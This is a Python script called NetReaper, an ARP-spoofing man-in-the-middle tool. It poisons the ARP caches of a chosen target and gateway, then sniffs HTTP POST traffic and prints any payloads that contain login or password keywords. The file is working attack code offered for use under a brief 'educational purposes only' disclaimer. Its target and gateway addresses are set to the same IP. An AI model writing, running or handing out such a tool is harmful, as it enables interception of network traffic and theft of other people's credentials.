# NetReaper v0.2
# An ARP spoofer and packet sniffer for educational MITM attacks.
# Coded by: [Your Name or Handle Here]
#
# WARNING: For educational purposes only. Only use on networks and devices
# you own and have explicit permission to test.

import sys
import time
import threading 
from scapy.all import ARP, Ether, srp, sendp, sniff, conf
from scapy.layers import http 
from rich.console import Console

console = Console()

def get_mac(ip_address: str) -> str | None:
    """Returns the MAC address for a given IP address."""
    arp_request = ARP(pdst=ip_address)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def spoof(target_ip: str, spoof_ip: str, target_mac: str):
    """Sends a spoofed ARP packet to the target."""
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, verbose=False)

def restore(dest_ip: str, src_ip: str, dest_mac: str, src_mac: str):
    """Restores the network by sending a legitimate ARP packet."""
    packet = Ether(dst=dest_mac) / ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    sendp(packet, count=4, verbose=False)


def arp_spoof_loop(target_ip, gateway_ip, target_mac, gateway_mac, stop_event):
    """
    A function to run the ARP spoofing loop in a separate thread.
    """
    console.print("[bold green]Starting ARP spoofing loop in the background...[/bold green]")
    while not stop_event.is_set():
        spoof(target_ip, gateway_ip, target_mac)
        spoof(gateway_ip, target_ip, gateway_mac)
        time.sleep(2)

def process_sniffed_packet(packet):
    """
    This is the callback function that will be executed for each sniffed packet.
    It checks for HTTP POST requests and looks for login credentials.
    """
    if packet.haslayer(http.HTTPRequest):
        if packet[http.HTTPRequest].Method == b'POST':
            url = packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
            console.print(f"\n[bold yellow][+] HTTP POST Request to:[/bold yellow] {url}")
            
            if packet.haslayer(http.Raw):
                load = packet[http.Raw].load.decode(errors='ignore')
                keywords = ["username", "user", "login", "password", "pass", "key"]
                
                if any(keyword in load.lower() for keyword in keywords):
                    console.print(f"[bold red][*] Potential credentials found:[/bold red]\n{load}")

def main():
    """Main function to run the ARP spoofer and packet sniffer."""
    target_ip = "192.168.43.65"  # <-- SET YOUR TARGET'S IP HERE
    gateway_ip = "192.168.43.65" # <-- SET YOUR GATEWAY/ROUTER'S IP HERE

    console.print("[bold cyan]NetReaper v0.2[/bold cyan] - MITM Sniffer", justify="center")
    console.print("[yellow]Acquiring MAC addresses...[/yellow]")
    
    try:
        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)
    except Exception:
        console.print(f"[bold red]Error:[/bold red] Could not get MAC addresses. Run as root/administrator.")
        sys.exit()

    if not target_mac or not gateway_mac:
        console.print(f"[bold red]Error:[/bold red] Could not get MAC for target or gateway. Check IPs.")
        sys.exit()
        
    console.print(f"[green]✓[/green] MAC addresses acquired.\n")
    
    stop_event = threading.Event()
    
    spoof_thread = threading.Thread(target=arp_spoof_loop, args=(target_ip, gateway_ip, target_mac, gateway_mac, stop_event))
    spoof_thread.daemon = True # Allows main thread to exit even if this thread is running
    spoof_thread.start()
    
    try:
        console.print("[bold green]Starting packet sniffer... Waiting for HTTP POST requests.[/bold green]")
        sniff(filter="port 80", prn=process_sniffed_packet, store=False)
        
    except KeyboardInterrupt:
        console.print("\n\n[bold yellow]Ctrl+C detected. Shutting down...[/bold yellow]")
        
    finally:
        stop_event.set()
        time.sleep(1) # Give the thread a moment to stop
        
        console.print("[yellow]Restoring ARP tables...[/yellow]")
        restore(target_ip, gateway_ip, target_mac, gateway_mac)
        restore(gateway_ip, target_ip, gateway_mac, target_mac)
        console.print("[bold green]✓[/bold green] Network restored. Exiting.")
        sys.exit()

if __name__ == "__main__":
    main()
